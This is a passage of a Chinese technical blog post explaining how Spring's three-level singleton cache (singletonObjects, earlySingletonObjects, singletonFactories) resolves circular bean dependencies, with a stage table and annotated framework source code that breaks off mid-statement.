<h3 id="三级缓存"><a href="#三级缓存" class="headerlink" title="三级缓存"></a>三级缓存</h3><p>通过我们上面的分析，二级缓存就可以解决循环依赖、多线程并发和AOP的所有问题。那么Spring引入三级缓存是为了什么？我们来看看三级缓存的里存的是什么：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 一级缓存 </span></span><br><span class="line"><span class="comment">  * 单例缓存池，用于保存所有成熟的Bean</span></span><br><span class="line"><span class="comment">  * key时Bean的名称，value是Bean实例</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; singletonObjects = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 二级缓存</span></span><br><span class="line"><span class="comment">  * 用户缓存早期对象(对象属性还没有来得及进行赋值)</span></span><br><span class="line"><span class="comment">  * key是Bean的名称，value是Bean实例</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; earlySingletonObjects = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 三级缓存 </span></span><br><span class="line"><span class="comment">  * key是Bean的名，value是一个ObjectFactory</span></span><br><span class="line"><span class="comment">  * ObjectFactory是一个接口，这里存放的是一个接口的实现</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ObjectFactory&lt;?&gt;&gt; singletonFactories = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 该集合用户缓存当前正在创建Bean的名称</span></span><br><span class="line"><span class="comment">  * 用于限制对二级、三级缓存的访问：</span></span><br><span class="line"><span class="comment">  * 1. 从缓存拿Bean的时候，如果Bean名称在这个集合中，可以访问所有缓存</span></span><br><span class="line"><span class="comment">  * 2. 如果Bean名称不在这个集合中，只能访问一级缓存</span></span><br><span class="line"><span class="comment">  * 这样设计，防止在非创建阶段访问二三级缓存，从而导致获取到不完整的Bean</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;String&gt; singletonsCurrentlyInCreation </span><br><span class="line">    = Collections.newSetFromMap(<span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>

<p>一级缓存里存的是成熟对象，二级缓存里存的是早期对象，这个我们之前已经介绍过了。而三级缓存中存的是<strong>ObjectFactory</strong>，这是个什么东西？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数式接口</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ObjectFactory</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 该方法需要返回一个Bean</span></span><br><span class="line">   T <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，它是一个函数式接口，其中的方法是<code>getObject</code>。我们再来看看Spring是如何往三级缓存中添加元素的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// addSingletonFactory方法存入三级缓存：</span></span><br><span class="line"><span class="comment">// 把早期对象包装成一个ObjectFactory的实现存入三级缓存</span></span><br><span class="line"><span class="comment">// 实现方式是通过getEarlyBeanReference方法返回一个早期Bean</span></span><br><span class="line">addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));</span><br></pre></td></tr></table></figure>

<p>可以看到，Spring提供了一个新的思路：不往缓存中放对象，而是将对象封装成一个接口的实现，存入三级缓存。那么什么时候放？<strong>实例化完成后，不再向二级缓存中放早期对象，而是将早期对象封装成一个接口的实现存入三级缓存。从三级缓存中拿到这个实现后，通过执行该实现方法拿到早期对象或者【代理对象】，再存入二级缓存。</strong></p>
<p>所以说，动态代理的过程也被封装到ObjectFactory接口的实现中了。最终Spring里真正的流程如下图：</p>
<p><a href="https://images.gitee.com/uploads/images/2020/1219/162042_4cd06685_8183653.jpeg"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1219/162042_4cd06685_8183653.jpeg"
                      alt="输入图片说明"
                ></a></p>
<p>可以看到，<strong>三级缓存和二级缓存打了一个配合</strong>：三级缓存接口的实现方法行后得到的对象放入二级缓存。我们可以得到如下结论：</p>
<ul>
<li>一旦某个Bean出现在了二级缓存中，那么这个Bean一定出现了循环依赖。如果某个Bean没有循环依赖，三级缓存中这个Bean封装的方法实现根本不会被执行，因此一定不会出现在二级缓存中。</li>
</ul>
<p>关于之前我们说的动态代理，Spring将其一起封装到了三级缓存中的接口的实现方法中了，所以说，<strong>A的动态代理会先在它循环依赖的B中完成</strong>。但是如果A没有循环依赖怎么办？那A不就不会被动态代理了吗？所以说A初始化完成后还要再动态代理一次。</p>
<blockquote>
<p>介绍完了三级依赖，各位读者觉得三级依赖的作用是什么？</p>
<ul>
<li>更加简洁？并没有更加简洁，反而更加复杂了。</li>
<li>动态代理和创建Bean的过程解耦？并没有解耦，因为初始化完成后还是需要动态代理。</li>
<li>扩展性更强？Spring的Bean的后置处理器似乎和它也没啥关系。</li>
<li>延迟加载？只存接口实现而不存Bean，如果没有循环依赖就不会执行接口的实现。但是迟早要执行，所以也没什么用。</li>
</ul>
<p>那到底有什么用？你觉得有什么用就有什么用。</p>
</blockquote>
<h3 id="流程小结"><a href="#流程小结" class="headerlink" title="流程小结"></a>流程小结</h3><p>假如A、B循环依赖，从A的创建开始，流程如下：</p>
<table>
<thead>
<tr>
<th>阶段</th>
<th>一级缓存</th>
<th>二级缓存</th>
<th>三级缓存</th>
</tr>
</thead>
<tbody><tr>
<td>A开始实例化</td>
<td>空</td>
<td>空</td>
<td>空</td>
</tr>
<tr>
<td>A实例化完成</td>
<td>空</td>
<td>空</td>
<td>A封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>A开始属性赋值，发现依赖B</td>
<td>空</td>
<td>空</td>
<td>A封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>B开始实例化</td>
<td>空</td>
<td>空</td>
<td>A封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>B实例化完成</td>
<td>空</td>
<td>空</td>
<td>A封装的ObjectFactory接口的实现、B封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>B开始属性赋值，发现依赖A</td>
<td>空</td>
<td>空</td>
<td>A封装的ObjectFactory接口的实现、B封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>从三级缓存中拿到A封装的ObjectFactory接口的实现并且执行</td>
<td>空</td>
<td>早期A（或者动态代理的A）</td>
<td>B封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>B完成属性赋值</td>
<td>空</td>
<td>早期A（或者动态代理的A）</td>
<td>B封装的ObjectFactory接口的实现</td>
</tr>
<tr>
<td>B完成初始化</td>
<td>成熟B</td>
<td>早期A（或者动态代理的A）</td>
<td>空</td>
</tr>
<tr>
<td>A完成属性赋值</td>
<td>成熟B</td>
<td>早期A（或者动态代理的A）</td>
<td>空</td>
</tr>
<tr>
<td>A完成初始化</td>
<td>成熟A、成熟B</td>
<td>空</td>
<td>空</td>
</tr>
</tbody></table>
<h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><p>之前我们已经介绍过了Bean的大致创建流程，从AbstractBeanFactory的<code>getBean</code>方法开始：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">      <span class="comment">// 真正的获取bean的逻辑doGetBean</span></span><br><span class="line">      <span class="keyword">return</span> doGetBean(name, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">doGetBean</span><span class="params">(<span class="keyword">final</span> String name, <span class="meta">@Nullable</span> <span class="keyword">final</span> Class&lt;T&gt; requiredType,</span></span><br><span class="line"><span class="params">		<span class="meta">@Nullable</span> <span class="keyword">final</span> Object[] args, <span class="type">boolean</span> typeCheckOnly)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获得Bean的转换获得Bean的名称，因为传入的可能是工厂Bean的名称</span></span><br><span class="line">	<span class="keyword">final</span> <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> transformedBeanName(name);</span><br><span class="line">	Object bean;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// getSingleton尝试去缓存中获取对象，这个方法非常重要</span></span><br><span class="line">	<span class="type">Object</span> <span class="variable">sharedInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sharedInstance != <span class="literal">null</span> &amp;&amp; args == <span class="literal">null</span>) &#123;</span><br><span class="line">	</span><br><span class="line">           ...</span><br><span class="line">               </span><br><span class="line">		<span class="comment">// 如果获取到了，下面的方法处理工厂Bean的情况，之后会直接返回</span></span><br><span class="line">		bean = getObjectForBeanInstance(sharedInstance, name, beanName, <span class="literal">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 这里可以看出Spring只能解决单例对象的循环依赖，不能解决构多例</span></span><br><span class="line">		<span class="keyword">if</span> (isPrototypeCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCurrentlyInCreationException</span>(beanName);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * 判断AbstractBeanFacotry工厂是否有父工厂</span></span><br><span class="line"><span class="comment">		 * (一般情况下是没有父工厂因为abstractBeanFactory直接是抽象类,不存在父工厂)</span></span><br><span class="line"><span class="comment">		 * 只有和SpringMvc整合的时才会有父子容器的概念，这里不过多介绍</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="type">BeanFactory</span> <span class="variable">parentBeanFactory</span> <span class="operator">=</span> getParentBeanFactory();</span><br><span class="line">		</span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 处理dependsOn的依赖(这个不是我们所谓的循环依赖)</span></span><br><span class="line">			String[] dependsOn = mbd.getDependsOn();</span><br><span class="line">				<span class="keyword">if</span> (dependsOn != <span class="literal">null</span>) &#123;</span><br><span class="line">				</span><br><span class="line">                    ... </span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 创建单例bean</span></span><br><span class="line">			<span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line">				<span class="comment">// 调用DefaultSingletonBeanRegistry的getSingleton方法</span></span><br><span class="line">				<span class="comment">// lambda表达式实现了ObjectFactory接口的getObject方法</span></span><br><span class="line">                   <span class="comment">// 将getObject方法方法作为参数传给getSingleton方法</span></span><br><span class="line">				<span class="comment">// 在getSingleton方法中会调用这个getObject方法创建Bean</span></span><br><span class="line">				sharedInstance = getSingleton(beanName, () -&gt; &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						<span class="comment">// 回调后执行createBean进入创建bean的逻辑</span></span><br><span class="line">						<span class="keyword">return</span> createBean(beanName, mbd, args);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">						<span class="comment">// 创建bean的过程中发生异常,需要销毁关于当前bean的所有信息</span></span><br><span class="line">						destroySingleton(beanName);</span><br><span class="line">						<span class="keyword">throw</span> ex;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;);</span><br><span class="line">				bean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (T) bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先看看DefaultSingletonBeanRegistry中的<code>getSingleton</code>方法，这个方法是从缓存中获取Bean，非常重要：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> Object <span class="title function_">getSingleton</span><span class="params">(String beanName)</span> &#123;</span><br><span class="line">      <span class="comment">// 接着调用</span></span><br><span class="line">      <span class="keyword">return</span> getSingleton(beanName, <span class="literal">true</span>);java</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">getSingleton</span><span class="params">(String beanName, <span class="type">boolean</span> allowEarlyReference)</span> &#123;</span><br><span class="line">	<span class="comment">// 1. 尝试去一级缓存拿Bean，拿到了就直接返回</span></span><br><span class="line">	<span class="type">Object</span> <span class="variable">singletonObject</span> <span class="operator">=</span> <span class="built_in">this</span>.singletonObjects.get(beanName);</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 若在一级缓存中没有获取到对象，并且该Bean正在创建(出现了循环依赖)</span></span><br><span class="line"><span class="comment">	 * 如果满足了上面两个条件，才可以去二级、三级缓存中拿</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (singletonObject == <span class="literal">null</span> &amp;&amp; isSingletonCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">           <span class="comment">// 这里加锁了</span></span><br><span class="line">		<span class="keyword">synchronized</span> (<span class="built_in">this</span>.singletonObjects) &#123;</span><br><span class="line">			<span class="comment">// 2.尝试去二级缓存中获取对象(早期对象)</span></span><br><span class="line">			singletonObject = <span class="built_in">this</span>.earlySingletonObjects.get(beanName);</span><br><span class="line">			<span class="comment">// 二级缓存中也没有获取到对象</span></span><br><span class="line">               <span class="comment">// 并且allowEarlyReference为true</span></span><br><span class="line">               <span class="comment">// 3.那么从三级缓存中拿</span></span><br><span class="line">               <span class="comment">// (这个参数是上一个方法传进来的，用于控制对三级缓存的访问)</span></span><br><span class="line">			<span class="keyword">if</span> (singletonObject == <span class="literal">null</span> &amp;&amp; allowEarlyReference) &#123;</span><br><span class="line">				<span class="comment">// 直接从三级缓存中获取ObjectFactory接口的实现</span></span><br><span class="line">				ObjectFactory&lt;?&gt; singletonFactory </span><br><span class="line">                       = <span class="built_in">this</span>.singletonFactories.get(beanName);</span><br><span class="line">				<span class="comment">// 4.如果从三级缓存中获取到对象不为空</span></span><br><span class="line">				<span class="keyword">if</span> (singletonFactory != <span class="literal">null</span>) &#123;</span><br><span class="line">				    <span class="comment">/** 执行实现ObjectFactory接口的getObject方法</span></span><br><span class="line"><span class="comment">					  * 又会调用到getEarlyBeanReference()来进行后置处理</span></span><br><span class="line"><span class="comment">					  * 返回的可能就是原早期对象，或者是一个动态代理后的代理对象</span></span><br><span class="line"><span class="comment">					  */</span></span><br><span class="line">					singletonObject = singletonFactory.getObject();</span><br><span class="line">					<span class="comment">// 把早期对象/或者代理对象放置在二级缓存</span></span><br><span class="line">					<span class="built_in">this</span>.earlySingletonObjects.put(beanName, singletonObject);</span><br><span class="line">					<span class="comment">// 把包装对象从三级缓存中删除掉</span></span><br><span class="line">					<span class="built_in">this</span>.singletonFactories.remove(beanName);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> singletonObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到从缓存中获取Bean的流程和我们之前分析的一样：如果Bean不是正在创建，只能去一级缓存中拿；如果Bean正在创建(出现循环依赖)，可以去所有缓存中去拿。在三级缓存中拿到ObjectFactory接口的实现的方法，执行后，将获取到的对象放入二级缓存。</p>
<p>那如果三级缓存中都没有呢？那就要开始创建Bean了，我们回到DefaultSingletonBeanRegistry中的<code>getSingleton</code>方法，注意这个<code>getSingleton</code>方法和上面的不一样！请看代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数singletonFactory是传进来的lambda表达式</span></span><br><span class="line">   <span class="comment">// 它实现了ObjectFactory接口的getObject方法，该方法中会进行回调</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSingleton</span><span class="params">(String beanName, ObjectFactory&lt;?&gt; singletonFactory)</span> &#123;</span><br><span class="line">      Assert.notNull(beanName, <span class="string">&quot;Bean name must not be null&quot;</span>);</span><br><span class="line">      <span class="comment">// 加锁</span></span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>.singletonObjects) &#123;</span><br><span class="line">         <span class="comment">// 尝试从一级缓存中获取对象</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">singletonObject</span> <span class="operator">=</span> <span class="built_in">this</span>.singletonObjects.get(beanName);</span><br><span class="line">         <span class="comment">// 如果没获取到</span></span><br><span class="line">         <span class="keyword">if</span> (singletonObject == <span class="literal">null</span>) &#123;</span><br><span class="line">             </span><br><span class="line">            ...</span><br><span class="line">                </span><br><span class="line">           <span class="comment">/** beforeSingletonCreation方法</span></span><br><span class="line"><span class="comment">             * 标记当前的Bean正在创建，就是将Bean的名称假如singletonsCurrentlyInCreation集合</span></span><br><span class="line"><span class="comment">             * 这里标记后，上面从二级、三级缓存中拿这个对象的条件就满足了</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            beforeSingletonCreation(beanName);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">newSingleton</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">recordSuppressedExceptions</span> <span class="operator">=</span> (<span class="built_in">this</span>.suppressedExceptions == <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (recordSuppressedExceptions) &#123;</span><br><span class="line">               <span class="built_in">this</span>.suppressedExceptions = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">// 回调传入的lambda表达式</span></span><br><span class="line">               <span class="comment">// 这个过程其实是调用AbstractAutowireCapableBeanFactory的createBean方法</span></span><br><span class="line">               singletonObject = singletonFactory.getObject();</span><br><span class="line">               newSingleton = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">               ...</span><br><span class="line"></span><br><span class="line">            <span class="keyword">finally</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (recordSuppressedExceptions) &#123;</span><br><span class="line">                  <span class="built_in">this</span>.suppressedExceptions = <span class="literal">null</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// 后置处理</span></span><br><span class="line">               <span class="comment">// 主要做的事情就是把Bean从正在创建的集合中移除</span></span><br><span class="line">               afterSingletonCreation(beanName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (newSingleton) &#123;</span><br><span class="line">               <span class="comment">// 将Bean加入缓存中</span></span><br><span class="line">               <span class="comment">// 方法的逻辑就是加入一级，并且从二级、三级缓存中移除</span></span><br><span class="line">               addSingleton(beanName, singletonObject);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> singletonObject;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>回调传入的lambda表达式，从而调用AbstractAutowireCapableBeanFactory的<code>createBean</code>方法，我们接着往下走：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">createBean</span><span class="params">(String beanName, RootBeanDefinition mbd, <span class="meta">@Nullable</span> Object[] args)</span></span><br><span class="line">         <span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">         logger.debug(<span class="string">&quot;Creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">RootBeanDefinition</span> <span class="variable">mbdToUse</span> <span class="operator">=</span> mbd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 确保此时的 bean 已经被解析了</span></span><br><span class="line">      Class&lt;?&gt; resolvedClass = resolveBeanClass(mbd, beanName);</span><br><span class="line">      <span class="keyword">if</span> (resolvedClass != <span class="literal">null</span> &amp;&amp; !mbd.hasBeanClass() &amp;&amp; mbd.getBeanClassName() != <span class="literal">null</span>) &#123;</span><br><span class="line">         mbdToUse = <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(mbd);</span><br><span class="line">         mbdToUse.setBeanClass(resolvedClass);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Prepare method overrides.</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          </span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 执行第1个bean后置处理器</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> resolveBeforeInstantiation(beanName, mbdToUse);</span><br><span class="line">         <span class="keyword">if</span> (bean != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbdToUse.getResourceDescription(), beanName,</span><br><span class="line">               <span class="string">&quot;BeanPostProcessor before instantiation of bean failed&quot;</span>, ex);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// doCreateBean才是真正的创建我们的bean的实例对象的过程</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">beanInstance</span> <span class="operator">=</span> doCreateBean(beanName, mbdToUse, args);</span><br><span class="line">         <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Finished creating instance of bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;    </span><br><span class="line">         ...</span><br><span class="line">   &#125;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">   <span class="comment">// doCreateBean就是真正Bean创建的逻辑</span></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">doCreateBean</span><span class="params">(<span class="keyword">final</span> String beanName, <span class="keyword">final</span> RootBeanDefinition mbd, <span class="keyword">final</span> <span class="meta">@Nullable</span> Object[] args)</span></span><br><span class="line">		<span class="keyword">throws</span> BeanCreationException &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// BeanWrapper是对Bean的包装</span></span><br><span class="line">	<span class="type">BeanWrapper</span> <span class="variable">instanceWrapper</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line">		<span class="comment">// 从没有完成的FactoryBean中移除</span></span><br><span class="line">		instanceWrapper = <span class="built_in">this</span>.factoryBeanInstanceCache.remove(beanName);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (instanceWrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="comment">// 1.实例化bean</span></span><br><span class="line">		instanceWrapper = createBeanInstance(beanName, mbd, args);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 从beanWrapper中获取早期对象</span></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> instanceWrapper.getWrappedInstance();</span><br><span class="line">	Class&lt;?&gt; beanType = instanceWrapper.getWrappedClass();</span><br><span class="line">	<span class="keyword">if</span> (beanType != NullBean.class) &#123;</span><br><span class="line">		mbd.resolvedTargetType = beanType;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allow post-processors to modify the merged bean definition.</span></span><br><span class="line">	<span class="keyword">synchronized</span> (mbd.postProcessingLock) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!mbd.postProcessed) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="comment">// 进行后置处理@AutoWired、@Value的注解的预解析</span></span><br><span class="line">				applyMergedBeanDefinitionPostProcessors(mbd, beanType, beanName);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName,</span><br><span class="line">						<span class="string">&quot;Post-processing of merged bean definition failed&quot;</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">			mbd.postProcessed = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 存放到三级缓存中</span></span><br><span class="line"><span class="comment">	 * 条件如下：</span></span><br><span class="line"><span class="comment">	 * 1. 是单例</span></span><br><span class="line"><span class="comment">	 * 2. 该Bean正在创建</span></span><br><span class="line"><span class="comment">	 * 3. allowCircularReferences为true</span></span><br><span class="line"><span class="comment">	 *    可以通过ApplicationContext的setAllowCircularReferences方法对其设置</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">boolean</span> <span class="variable">earlySingletonExposure</span> <span class="operator">=</span> (mbd.isSingleton() &amp;&amp; <span class="built_in">this</span>.allowCircularReferences &amp;&amp;</span><br><span class="line">			isSingletonCurrentlyInCreation(beanName));</span><br><span class="line">	<span class="comment">// 上述条件满足</span></span><br><span class="line">	<span class="keyword">if</span> (earlySingletonExposure) &#123;</span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			logger.debug(<span class="string">&quot;Eagerly caching bean &#x27;&quot;</span> + beanName +</span><br><span class="line">					<span class="string">&quot;&#x27; to allow for resolving potential circular references&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 2.存入三级缓存的是一个接口的实现</span></span><br><span class="line">		<span class="comment">// 把早期对象包装成一个ObjectFactory接口的实现</span></span><br><span class="line">           <span class="comment">// 实现了getObject方法，该方法内部调用getEarlyBeanReference方法</span></span><br><span class="line">		addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Initialize the bean instance.</span></span><br><span class="line">	<span class="type">Object</span> <span class="variable">exposedObject</span> <span class="operator">=</span> bean;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="comment">// 3.属性赋值，这里会涉及到循环依赖</span></span><br><span class="line">		populateBean(beanName, mbd, instanceWrapper);</span><br><span class="line">		<span class="comment">// 4.进行对象初始化操作(在这里可能生成代理对象)</span></span><br><span class="line">		exposedObject = initializeBean(beanName, exposedObject, mbd);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ex <span class="keyword">instanceof</span> BeanCreationException &amp;&amp; beanName.equals(((BeanCreationException) ex).getBeanName())) &#123;</span><br><span class="line">			<span class="keyword">throw</span> (BeanCreationException) ex;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(</span><br><span class="line">					mbd.getResourceDescription(), beanName, <span class="string">&quot;Initialization of bean failed&quot;</span>, ex);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 是早期对象暴露</span></span><br><span class="line">	<span class="keyword">if</span> (earlySingletonExposure) &#123;</span><br><span class="line">		<span class="comment">// 去缓存中获取到我们的对象，由于传递的allowEarlyReference是false </span></span><br><span class="line">	    <span class="comment">// 只能在一级二级缓存中去获取</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">earlySingletonReference</span> <span class="operator">=</span> getSingleton(beanName, <span class="literal">false</span>);</span><br><span class="line">		<span class="comment">// 能够获取到,说明出现了循环依赖</span></span><br><span class="line">		<span class="keyword">if</span> (earlySingletonReference != <span class="literal">null</span>) &#123;</span><br><span class="line">			<span class="comment">// 经过后置处理初始化后的Bean和早期的Bean引用还相等的话</span></span><br><span class="line">               <span class="comment">// 表示当前的Bean没有代理，用从二级缓存中获取到Bean的覆盖当前Bean</span></span><br><span class="line">			<span class="keyword">if</span> (exposedObject == bean) &#123;</span><br><span class="line">				exposedObject = earlySingletonReference;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 处理依赖的Bean</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.allowRawInjectionDespiteWrapping &amp;&amp; 